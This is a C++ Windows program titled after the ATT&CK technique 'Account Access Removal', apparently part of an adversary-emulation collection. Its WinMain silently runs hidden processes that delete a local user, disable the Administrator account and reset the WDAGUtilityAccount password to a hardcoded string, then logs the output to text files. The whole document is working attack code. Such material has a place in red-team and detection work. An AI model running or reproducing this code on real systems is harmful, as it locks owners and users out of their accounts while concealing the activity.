---
title: "T1531.Account Access Removal"
folder: "14. Impact"
---





#include <windows.h>
#include <fstream>
#include <iostream>


void usu() {
        std::ofstream outputFile("usu.txt");
        const char* command = "net user User /delete";

        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }

        STARTUPINFOA si = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;

        PROCESS_INFORMATION pi;

        if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }

        CloseHandle(hWritePipe);

        const int BUFFER_SIZE = 4096;
        char buffer[BUFFER_SIZE];
        DWORD bytesRead;

        while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
            std::string data(buffer, bytesRead);
            size_t pos = 0;

            while ((pos = data.find("\n", pos)) != std::string::npos) {
                data.erase(pos, 1);
            }

            outputFile.write(data.c_str(), data.size());
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        outputFile.close();
    }


void wylaczenie() {
        std::ofstream outputFile("zmiena.txt");
        const char* command = "net user Administrator /active:no";

        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }

        STARTUPINFOA si = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;

        PROCESS_INFORMATION pi;

        if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }

        CloseHandle(hWritePipe);

        const int BUFFER_SIZE = 4096;
        char buffer[BUFFER_SIZE];
        DWORD bytesRead;

        while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
            std::string data(buffer, bytesRead);
            size_t pos = 0;

            while ((pos = data.find("\n", pos)) != std::string::npos) {
                data.erase(pos, 1);
            }

            outputFile.write(data.c_str(), data.size());
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        outputFile.close();
    }

void Zmianahasla() {
        std::ofstream outputFile("zmianahas.txt");
        const char* command = "net user WDAGUtilityAccount ARE$S7rAE%sed&65de6";

        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }

        STARTUPINFOA si = {};
        si.cb = sizeof(STARTUPINFOA);
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        si.hStdError = hWritePipe;
        si.hStdOutput = hWritePipe;

        PROCESS_INFORMATION pi;

        if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }

        CloseHandle(hWritePipe);

        const int BUFFER_SIZE = 4096;
        char buffer[BUFFER_SIZE];
        DWORD bytesRead;

        while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
            std::string data(buffer, bytesRead);
            size_t pos = 0;

            while ((pos = data.find("\n", pos)) != std::string::npos) {
                data.erase(pos, 1);
            }

            outputFile.write(data.c_str(), data.size());
        }

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        outputFile.close();
    }

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    usu();
    wylaczenie();
    Zmianahasla();
    return 0;
}